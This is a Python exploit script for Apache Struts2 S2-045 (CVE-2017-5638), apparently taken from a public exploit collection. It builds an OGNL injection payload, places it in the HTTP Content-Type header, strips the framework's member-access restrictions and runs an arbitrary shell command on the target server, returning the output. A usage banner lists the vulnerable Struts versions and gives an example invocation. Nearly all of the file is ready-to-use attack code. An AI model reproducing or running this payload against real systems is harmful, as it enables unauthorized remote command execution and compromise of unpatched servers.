#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import httplib

def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead as e:
        page = e.partial

    print(page)
    return page

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        print('+-------------------------------------------------------------------+')
        print('+ DES: by zhzyker as https://github.com/zhzyker/exphub              +')
        print('+ USE: python3 <filename> <url> <cmd>                               +')
        print('+ EXP: python3 struts2-045-2_cmd.py http://xxxx/login.action "id"   +')
        print('+ VER: Struts 2.3.5 – Struts 2.3.31                                 +')
        print('+      Struts 2.5.0 – Struts 2.5.10                                 +')
        print('+-------------------------------------------------------------------+')
    else:
        print('[+] Find CVE-2017-5638 - Apache Struts2 S2-045 Vuln!!!')
        url = sys.argv[1]
        cmd = sys.argv[2]
        print("[+] cmd: %s\n" % cmd)
        exploit(url, cmd)
